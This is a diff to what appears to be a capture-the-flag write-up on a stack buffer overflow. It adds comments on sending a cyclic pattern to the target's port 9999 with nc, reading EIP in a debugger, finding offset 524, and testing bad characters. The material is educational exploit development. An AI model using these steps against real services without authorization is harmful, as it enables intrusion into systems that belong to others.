@@ -78,6 +78,8 @@ To determine the EIP next I used:
 └─$ msf-pattern_create -l 2000
 Aa0Aa1Aa2Aa3A...
 ...
+
+# Then simply enter string created into password field and view EIP value in Immunity Debugger.
 └─$ nc Target_IP 9999
 _|                            _|                                        
 _|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
@@ -92,9 +94,10 @@ _|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
 
                           >> Aa0Aa1Aa2A...
 ...
+# After obtaining EIP value determine the offset required before the EIP field.
+
 └─$ msf-pattern_offset -q 35724134
-[*] Exact match at offset 524
-                                         
+[*] Exact match at offset 524                                         
 ```
 Now offset determined, next quick look at badchar that might affect it.
 - Ran similar python script added 4 * b'B' and added bad char list from \x01 to \xff
